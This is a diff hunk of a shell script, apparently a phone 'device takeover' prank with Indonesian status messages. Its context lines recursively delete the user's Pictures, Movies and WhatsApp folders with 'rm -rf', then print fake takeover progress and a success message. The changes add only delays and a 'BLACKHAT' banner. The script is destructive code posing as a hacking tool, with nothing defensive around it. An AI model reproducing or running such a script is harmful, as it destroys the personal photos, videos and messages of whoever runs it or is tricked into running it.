@@ -12,6 +12,9 @@ rm -rf Pictures
 rm -rf Movies
 rm -rf WhatsApp
 echo "Memperoses Persetujuan Mengambil Alih Perangkat..."
+sleep 2
 echo "Pengambil Alihan Perangkat 50%"
+sleep 2
 echo "SUKSES"
 echo "Perangkat Telah Di Ambil Alih Oleh User : Alt+F4"
+figlet BLACKHAT |lolcat
